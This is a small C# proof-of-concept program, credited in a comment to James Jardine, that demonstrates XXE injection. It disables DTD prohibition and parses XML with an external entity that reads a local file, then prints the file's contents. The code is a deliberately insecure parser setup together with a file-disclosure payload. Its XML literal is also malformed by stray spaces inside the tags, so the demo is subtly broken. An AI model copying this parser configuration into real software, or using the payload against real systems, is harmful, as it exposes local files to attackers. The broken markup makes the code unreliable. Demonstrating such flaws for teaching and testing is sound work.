using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;

// POC: James Jardine

namespace XXE
{
    class Program
    {
        static void Main(string[] args)
        {
            string xml = "<?xml version=\"1.0\" ?><!DOCTYPE doc " +
                "[< !ENTITY win SYSTEM \"file:///C:/tools/testdata2.txt\">]>" +
                "< doc > &win;</ doc > ";

            XmlReaderSettings rs = new XmlReaderSettings();

            rs.ProhibitDtd = false;

            XmlReader myReader = XmlReader.Create(new StringReader(xml), rs);

            while (myReader.Read())
            {
                Console.WriteLine(myReader.Value);
            }
            Console.ReadLine();
        }
    }
}
